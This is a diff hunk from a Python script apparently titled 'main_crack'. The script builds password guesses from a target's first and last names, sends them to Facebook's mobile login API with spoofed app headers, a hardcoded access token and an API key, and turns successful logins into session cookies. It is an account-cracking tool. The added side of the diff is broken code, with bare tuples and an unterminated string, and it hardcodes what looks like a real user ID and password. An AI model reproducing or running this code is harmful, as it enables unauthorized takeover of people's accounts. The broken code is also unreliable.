@@ -440,42 +440,35 @@ class main_crack():
             for pw in psw:
                 ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                 with requests.Session() as session:
-                    data = {"adid": str(uuid.uuid4()),
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"cpl": "true",
-"family_device_id": str(uuid.uuid4()),
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "device_based_login",
-"email": sid,
-"password": ps,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"meta_inf_fbmeta": "",
-"advertiser_id": str(uuid.uuid4()),
-"currently_logged_in_userid": "0",
-"locale": "fr_IN",
-"client_country_code": "NP",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent':('[FBAN/FB4A;FBAV/49.0.0.4120;FBBV/9006006;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'),
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-'X-FB-Connection-Type': 'unknown',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                    data = ('adid', 'cde46752-9cd1-45ca-9b33-f82698a7a491')
+('format', 'json')
+('device_id', '3b9ab885-b403-481f-ad91-5a88b1273c1d')
+('cpl', 'true')
+('family_device_id', 'e0f270b3-9f3e-4338-ad30-7a2f44fb5147')
+('credentials_type', 'device_based_login_password')
+('error_detail_type', 'button_with_disabled')
+('source', 'device_based_login')
+('email', '100049974613980')
+('password', 'md123')
+('access_token', '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32')
+('generate_session_cookies', '1')
+('meta_inf_fbmeta', '')
+('advertiser_id', 'bc275a19-ce39-4ed4-b130-0e87144b9071')
+('currently_logged_in_userid', '0')
+('locale', 'en_GB')
+('client_country_code', 'GB')
+('method', 'auth.login
+('fb_api_req_friendly_name', 'authenticate')
+('fb_api_caller_class', 'com.facebook.account.login.protocol.Fb4aAuthHandler')
+('api_key', '882a8490361da98702bf97a021ddc14d')
+                headers = ('Host', 'b-graph.facebook.com')
+('x-fb-connection-bandwidth', '27449845')
+('x-fb-sim-hni', '38531')
+('x-fb-net-hni', '20691')
+('x-fb-connection-quality', 'EXCELLENT')
+('user-agent', 'Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07,width=1080,height=2460};FBLC/en_US;FBCR/Freenet;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;] ')
+('content-type', 'application/x-www-form-urlencoded')
+('x-fb-http-engine', 'Liger')
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DANGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DANGERb};{ckkk}"
